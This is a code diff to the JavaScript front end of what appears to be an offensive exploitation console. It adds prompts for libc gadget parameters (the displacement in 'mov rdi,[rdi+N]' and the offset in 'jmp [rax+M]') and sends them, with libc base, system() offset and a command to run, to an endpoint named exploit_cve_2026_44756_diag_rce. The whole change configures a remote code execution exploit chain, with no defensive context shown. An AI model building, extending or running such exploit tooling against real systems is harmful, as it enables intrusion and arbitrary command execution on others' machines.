@@ -8155,6 +8155,8 @@ async function ctxAction(action) {
       let stage1_dw_off_hex = '';
       let stage2_libc_off_hex = '';
       let system_libc_off_hex = '';
+      let stage2_disp_rdi_hex = '';
+      let stage2_b_off_hex = '';
       if (useOverride) {
         let v = prompt(
           'STAGE1_DW_OFF (hex) — offset of\n'
@@ -8163,9 +8165,9 @@ async function ctxAction(action) {
         if (v === null) break;
         stage1_dw_off_hex = v.trim();
         v = prompt(
-          'STAGE2_LIBC_OFF (hex) — offset of\n'
-          + '    mov rdi,[rdi+8]; jmp [rax]\n'
-          + 'inside libc.  Empty = use default (0x97dba).', '');
+          'STAGE2_LIBC_OFF (hex) — offset of the stage2 gadget\n'
+          + '(mov rdi,[rdi+DISP]; jmp [rax+B_OFF]) inside libc.\n'
+          + 'Empty = use default (0x97dba).', '');
         if (v === null) break;
         stage2_libc_off_hex = v.trim();
         v = prompt(
@@ -8173,17 +8175,33 @@ async function ctxAction(action) {
           + 'libc.  Empty = use default (0x58fae).', '');
         if (v === null) break;
         system_libc_off_hex = v.trim();
+        v = prompt(
+          'STAGE2_DISP_RDI (hex) — the "N" in "mov rdi,[rdi+N]" of\n'
+          + 'the stage2 gadget.  find_gadgets.py prints this ONLY when\n'
+          + 'the gadget uses a non-default disp.  Empty = use default (0x08).',
+          '');
+        if (v === null) break;
+        stage2_disp_rdi_hex = v.trim();
+        v = prompt(
+          'STAGE2_B_OFF (hex) — the "M" in "jmp [rax+M]" of the\n'
+          + 'stage2 gadget.  find_gadgets.py prints this ONLY when\n'
+          + 'the gadget uses a non-default disp.  Empty = use default (0x00).',
+          '');
+        if (v === null) break;
+        stage2_b_off_hex = v.trim();
       }
       const body = {
-        confirm:             true,
-        command:             command || defaultCmd,
-        dw_base_hex:         dw_base_hex,
-        libc_base_hex:       libc_base_hex,
-        rdx_hex:             rdx_hex,
-        auto_capture:        true,
-        stage1_dw_off_hex:   stage1_dw_off_hex,
-        stage2_libc_off_hex: stage2_libc_off_hex,
-        system_libc_off_hex: system_libc_off_hex,
+        confirm:              true,
+        command:              command || defaultCmd,
+        dw_base_hex:          dw_base_hex,
+        libc_base_hex:        libc_base_hex,
+        rdx_hex:              rdx_hex,
+        auto_capture:         true,
+        stage1_dw_off_hex:    stage1_dw_off_hex,
+        stage2_libc_off_hex:  stage2_libc_off_hex,
+        system_libc_off_hex:  system_libc_off_hex,
+        stage2_disp_rdi_hex:  stage2_disp_rdi_hex,
+        stage2_b_off_hex:     stage2_b_off_hex,
       };
       await api('POST', `node/${sid}/exploit_cve_2026_44756_diag_rce`, body);
       break;
